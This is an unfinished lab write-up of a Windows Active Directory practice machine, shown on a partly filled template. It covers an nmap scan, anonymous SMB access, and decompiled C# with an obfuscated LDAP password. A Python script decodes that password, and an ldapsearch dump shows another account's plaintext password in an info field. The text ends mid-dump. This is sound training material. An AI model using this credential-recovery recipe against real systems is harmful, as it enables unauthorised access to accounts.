
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
 nmap -sCV support.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-06 06:50 EDT
Nmap scan report for support.htb (10.129.230.181)
Host is up (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-06 10:51:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-06T10:51:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.96 seconds

```

Initial enumeration reveals common services found in an AD enviroment.
### SMB Enumeration

Enumerating shares with anonymous access discloses a non default share which contains a zip file for an executable binary, with the name UserInfo.exe.zip

```
smbclient -L //support.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ smbclient //support.htb/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 959242 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (328.1 KiloBytes/sec) (average 328.1 KiloBytes/sec)
smb: \> 

```

The file is downloaded locally and performing reverse engineering (?) with ilspycmd Reveals a function to encrypt the password for the user `ldap`:

```
ilspycmd UserInfo.exe
using System;
using System.Collections;
using System.Diagnostics;
using System.DirectoryServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MatthiWare.CommandLine;
using MatthiWare.CommandLine.Abstractions.Command;
using MatthiWare.CommandLine.Core.Attributes;
using UserInfo.Services;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("UserInfo")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("UserInfo")]
[assembly: AssemblyCopyright("Copyright ©  2022")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.8", FrameworkDisplayName = ".NET Framework 4.8")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace UserInfo
{
        internal class Program
        {
                private static async Task Main(string[] args)
                {
                        CommandLineParser<GlobalOptions> commandLineParser = new CommandLineParser<GlobalOptions>(new CommandLineParserOptions
                        {
                                AppName = "UserInfo.exe"
                        });
                        commandLineParser.DiscoverCommands(Assembly.GetExecutingAssembly());
                        _ = (await commandLineParser.ParseAsync(args)).HasErrors;
                }
        }
        public class GetUserOptions
        {
                [Name("username")]
                [Required(true)]
                [Description("Username")]
                public string UserName { get; set; }
        }
        public class FindUserOptions
        {
                [Name("first")]
                [Description("First name")]
                public string FirstName { get; set; }

                [Name("last")]
                [Description("Last name")]
                public string LastName { get; set; }
        }
        public class GlobalOptions
        {
                [Name("v", "verbose")]
                [DefaultValue(false)]
                [Description("Verbose output")]
                public bool Verbose { get; set; }
        }
}
namespace UserInfo.Services
{
        internal class Protected
        {
                private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

                private static byte[] key = Encoding.ASCII.GetBytes("armando");

                public static string getPassword()
                {
                        byte[] array = Convert.FromBase64String(enc_password);
                        byte[] array2 = array;
                        for (int i = 0; i < array.Length; i++)
                        {
                                array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
                        }
                        return Encoding.Default.GetString(array2);
                }
        }
        internal class LdapQuery
        {
                private DirectoryEntry entry;

                private DirectorySearcher ds;

                public LdapQuery()
                {
                        //IL_0018: Unknown result type (might be due to invalid IL or missing references)
                        //IL_0022: Expected O, but got Unknown
                        //IL_0035: Unknown result type (might be due to invalid IL or missing references)
                        //IL_003f: Expected O, but got Unknown
                        string password = Protected.getPassword();
                        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
                        entry.set_AuthenticationType((AuthenticationTypes)1);
                        ds = new DirectorySearcher(entry);
                }

                public void query(string first, string last, bool verbose = false)
                {
                        //IL_011e: Unknown result type (might be due to invalid IL or missing references)
                        try
                        {
                                if (first == null && last == null)
                                {
                                        Console.WriteLine("[-] At least one of -first or -last is required.");
                                        return;
                                }
                                string text = ((last == null) ? ("(givenName=" + first + ")") : ((first != null) ? ("(&(givenName=" + first + ")(sn=" + last + "))") : ("(sn=" + last + ")")));
                                if (verbose)
                                {
                                        Console.WriteLine("[*] LDAP query to use: " + text);
                                }
                                ds.set_Filter(text);
                                ds.get_PropertiesToLoad().Add("sAMAccountName");
                                SearchResultCollection val = ds.FindAll();
                                if (val.get_Count() == 0)
                                {
                                        Console.WriteLine("[-] No users identified with that query.");
                                        return;
                                }
                                if (verbose)
                                {
                                        string text2 = "[+] Found " + val.get_Count() + " result";
                                        if (val.get_Count() > 1)
                                        {
                                                text2 += "s";
                                        }
                                        text2 += ":";
                                        Console.WriteLine(text2);
                                }
                                foreach (SearchResult item in val)
                                {
                                        if (verbose)
                                        {
                                                Console.Write("       ");
                                        }
                                        Console.WriteLine(item.get_Properties().get_Item("sAMAccountName").get_Item(0));
                                }
                        }
                        catch (Exception ex)
                        {
                                Console.WriteLine("[-] Exception: " + ex.Message);
                        }
                }

                public void printUser(string username, bool verbose = false)
                {
                        try
                        {
                                if (verbose)
                                {
                                        Console.WriteLine("[*] Getting data for " + username);
                                }
                                ds.set_Filter("sAMAccountName=" + username);
                                ds.get_PropertiesToLoad().Add("pwdLastSet");
                                ds.get_PropertiesToLoad().Add("lastLogon");
                                ds.get_PropertiesToLoad().Add("givenName");
                                ds.get_PropertiesToLoad().Add("sn");
                                ds.get_PropertiesToLoad().Add("mail");
                                SearchResult val = ds.FindOne();
                                if (val == null)
                                {
                                        Console.WriteLine("[-] Unable to locate " + username + ". Please try the find command to get the user's username.");
                                        return;
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("givenName")).Count > 0)
                                {
                                        Console.WriteLine("First Name:           " + val.get_Properties().get_Item("givenName").get_Item(0));
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("sn")).Count > 0)
                                {
                                        Console.WriteLine("Last Name:            " + val.get_Properties().get_Item("sn").get_Item(0));
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("mail")).Count > 0)
                                {
                                        Console.WriteLine("Contact:              " + val.get_Properties().get_Item("mail").get_Item(0));
                                }
                                if (val.get_Properties().Contains("pwdLastSet"))
                                {
                                        Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.get_Properties().get_Item("pwdLastSet").get_Item(0)));
                                }
                        }
                        catch (Exception ex)
                        {
                                Console.WriteLine("[-] Exception: " + ex.Message);
                        }
                }
        }
}
namespace UserInfo.Commands
{
        public class FindUser : Command<GlobalOptions, FindUserOptions>
        {
                public override void OnConfigure(ICommandConfigurationBuilder builder)
                {
                        builder.Name("find").Description("Find a user");
                }

                public override async Task OnExecuteAsync(GlobalOptions options, FindUserOptions commandOptions, CancellationToken cancellationToken)
                {
                        new LdapQuery().query(commandOptions.FirstName, commandOptions.LastName, options.Verbose);
                }
        }
        public class GetUser : Command<GlobalOptions, GetUserOptions>
        {
                public override void OnConfigure(ICommandConfigurationBuilder builder)
                {
                        builder.Name("user").Description("Get information about a user");
                }

                public override async Task OnExecuteAsync(GlobalOptions options, GetUserOptions commandOptions, CancellationToken cancellationToken)
                {
                        new LdapQuery().printUser(commandOptions.UserName, options.Verbose);
                }
        }
}
```

Decrypting the password:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = bytearray(base64.b64decode(enc_password))

for i in range(len(data)):
    data[i] = (data[i] ^ key[i % len(key)]) ^ 0xDF
    
try:
    result = data.decode("cp1252")
except UnicodeDecodeError:
    result = data.decode("utf-8", errors="replace")

print(result)

```

recovered credentials:

`ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---
## Foothold

Enumerating users  throgh ldap quries:

```
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(&(objectCategory=person)(objectClass=user))"
```

The `support` user has plaintext credentials in the info field:

```             
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (&(objectCategory=person)(objectClass=user))
# requesting: ALL
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20260713122909.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=support,DC=htb
uSNChanged: 90151
name: Administrator
objectGUID:: ltGa4T+PO0uTHnjAEEcLlw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133028750237139482
lastLogoff: 0
lastLogon: 134284193675479259
logonHours:: ////////////////////////////
pwdLastSet: 133027269567293588
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 75
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101181216.0Z
lastLogonTimestamp: 134284193498605360

# Guest, Users, support.htb
dn: CN=Guest,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20220528112053.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=support,DC=htb
uSNChanged: 13091
name: Guest
objectGUID:: lHQIHI+KY06QsghOU1eULw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
logonHours:: ////////////////////////////
pwdLastSet: 132982103352120821
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9QEAAA==
accountExpires: 0
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132982104536495506

# krbtgt, Users, support.htb
dn: CN=krbtgt,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: krbtgt
description: Key Distribution Center Service Account
distinguishedName: CN=krbtgt,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110343.0Z
whenChanged: 20220528111947.0Z
uSNCreated: 12324
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=support,DC=htb
uSNChanged: 13087
showInAdvancedViewOnly: TRUE
name: krbtgt
objectGUID:: /xb62J8VtUOrxKFMpoVR1g==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982094237626330
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9gEAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgt
sAMAccountType: 805306368
servicePrincipalName: kadmin/changepw
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# ldap, Users, support.htb
dn: CN=ldap,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ldap
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=ldap,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111146.0Z
whenChanged: 20260713131910.0Z
uSNCreated: 12603
uSNChanged: 90204
company: support
streetAddress: Skipper Bowles Dr
name: ldap
objectGUID:: /6UvjDrNT0GyZFt9CzrgfQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 134284224682821858
pwdLastSet: 132982099064620523
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUAQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: ldap
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111146.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134284223502041266

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# smith.rosario, Users, support.htb
dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: smith.rosario
sn: smith
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: rosario
distinguishedName: CN=smith.rosario,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111219.0Z
whenChanged: 20220528111219.0Z
uSNCreated: 12638
uSNChanged: 12653
company: support
streetAddress: Skipper Bowles Dr
name: smith.rosario
objectGUID:: xrmo4GlsuUajfnkG3CBMrg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099393057986
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: smith.rosario
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111219.0Z
dSCorePropagationData: 16010101000000.0Z
mail: smith.rosario@support.htb

# hernandez.stanley, Users, support.htb
dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: hernandez.stanley
sn: hernandez
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: stanley
distinguishedName: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111234.0Z
whenChanged: 20220528111235.0Z
uSNCreated: 12655
uSNChanged: 12670
company: support
streetAddress: Skipper Bowles Dr
name: hernandez.stanley
objectGUID:: L81uL06kXEOWM2Qn8ww2qA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099548708177
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: hernandez.stanley
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111235.0Z
dSCorePropagationData: 16010101000000.0Z
mail: hernandez.stanley@support.htb

# wilson.shelby, Users, support.htb
dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: wilson.shelby
sn: wilson
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: shelby
distinguishedName: CN=wilson.shelby,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111250.0Z
whenChanged: 20220528111251.0Z
uSNCreated: 12672
uSNChanged: 12687
company: support
streetAddress: Skipper Bowles Dr
name: wilson.shelby
objectGUID:: XbKIVlHxiUa1D5CZfJJG9A==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099703526781
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: wilson.shelby
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111250.0Z
dSCorePropagationData: 16010101000000.0Z
mail: wilson.shelby@support.htb

# anderson.damian, Users, support.htb
dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: anderson.damian
sn: anderson
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: damian
distinguishedName: CN=anderson.damian,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111305.0Z
whenChanged: 20220528111306.0Z
uSNCreated: 12689
uSNChanged: 12704
company: support
streetAddress: Skipper Bowles Dr
name: anderson.damian
objectGUID:: 3yoA+1yHqUaNkyZV3AwohQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099859932951
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: anderson.damian
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111306.0Z
dSCorePropagationData: 16010101000000.0Z
mail: anderson.damian@support.htb

# thomas.raphael, Users, support.htb
dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: thomas.raphael
sn: thomas
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: raphael
distinguishedName: CN=thomas.raphael,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111321.0Z
whenChanged: 20220528111322.0Z
uSNCreated: 12706
uSNChanged: 12721
company: support
streetAddress: Skipper Bowles Dr
name: thomas.raphael
objectGUID:: sard51WjwU2UuCtT0BGwug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100017745577
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: thomas.raphael
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111322.0Z
dSCorePropagationData: 16010101000000.0Z
mail: thomas.raphael@support.htb

# levine.leopoldo, Users, support.htb
dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: levine.leopoldo
sn: levine
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: leopoldo
distinguishedName: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111337.0Z
whenChanged: 20220528111338.0Z
uSNCreated: 12891
uSNChanged: 12906
company: support
streetAddress: Skipper Bowles Dr
name: levine.leopoldo
objectGUID:: zaT1TYtnNUKvrkK/fHjf0Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100175089241
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: levine.leopoldo
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111337.0Z
dSCorePropagationData: 16010101000000.0Z
mail: levine.leopoldo@support.htb

# raven.clifton, Users, support.htb
dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: raven.clifton
sn: raven
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: clifton
distinguishedName: CN=raven.clifton,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111352.0Z
whenChanged: 20220528111353.0Z
uSNCreated: 12908
uSNChanged: 12923
company: support
streetAddress: Skipper Bowles Dr
name: raven.clifton
objectGUID:: r4Ljo7fDek6FZN1CBI375w==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100331339215
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: raven.clifton
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111353.0Z
dSCorePropagationData: 16010101000000.0Z
mail: raven.clifton@support.htb

# bardot.mary, Users, support.htb
dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: bardot.mary
sn: bardot
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: mary
distinguishedName: CN=bardot.mary,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111408.0Z
whenChanged: 20220528111409.0Z
uSNCreated: 12925
uSNChanged: 12940
company: support
streetAddress: Skipper Bowles Dr
name: bardot.mary
objectGUID:: bp+GlFYgwUiy169DiKxEfg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100486339253
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: bardot.mary
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111408.0Z
dSCorePropagationData: 16010101000000.0Z
mail: bardot.mary@support.htb

# cromwell.gerard, Users, support.htb
dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: cromwell.gerard
sn: cromwell
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: gerard
distinguishedName: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111424.0Z
whenChanged: 20220528111424.0Z
uSNCreated: 12942
uSNChanged: 12957
company: support
streetAddress: Skipper Bowles Dr
name: cromwell.gerard
objectGUID:: t5fIUmTNZEmsOEoXkg1PfA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100642589204
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cromwell.gerard
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111424.0Z
dSCorePropagationData: 16010101000000.0Z
mail: cromwell.gerard@support.htb

# monroe.david, Users, support.htb
dn: CN=monroe.david,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: monroe.david
sn: monroe
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: david
distinguishedName: CN=monroe.david,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111439.0Z
whenChanged: 20220528111440.0Z
uSNCreated: 12959
uSNChanged: 12974
company: support
streetAddress: Skipper Bowles Dr
name: monroe.david
objectGUID:: BAScccXiIEKhwgp//rBwwA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100797120581
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: monroe.david
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111439.0Z
dSCorePropagationData: 16010101000000.0Z
mail: monroe.david@support.htb

# west.laura, Users, support.htb
dn: CN=west.laura,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: west.laura
sn: west
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: laura
distinguishedName: CN=west.laura,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111455.0Z
whenChanged: 20220528111456.0Z
uSNCreated: 12979
uSNChanged: 12994
company: support
streetAddress: Skipper Bowles Dr
name: west.laura
objectGUID:: bqAMeaq42kGIZbfMnxXxRA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100954464244
primaryGroupID: 513
